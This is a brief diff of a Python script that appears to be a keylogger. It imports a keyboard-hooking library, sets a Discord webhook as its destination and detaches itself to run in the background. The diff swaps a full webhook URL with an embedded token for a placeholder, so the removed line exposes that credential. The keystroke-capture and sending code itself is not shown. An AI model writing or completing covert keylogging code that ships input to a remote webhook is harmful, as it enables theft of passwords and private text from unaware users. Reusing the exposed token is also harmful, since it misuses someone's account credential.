@@ -7,7 +7,7 @@ import keyboard
 import time
 
 # Your webhook URL
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1402658719006982309/XjcAaLCvIEPEIagGHeiIf9b8JwuUdJMFYL_A4-voHKa8t6Nzm7RW_yGkzygIFDrfLvKe"
+WEBHOOK_URL = "discord webhook"
 
 def detach_and_run():
     """Detach the process and run in background"""
@@ -69,4 +69,5 @@ def main_program():
         keyboard.unhook_all()
 
 if __name__ == "__main__":
+
     detach_and_run()
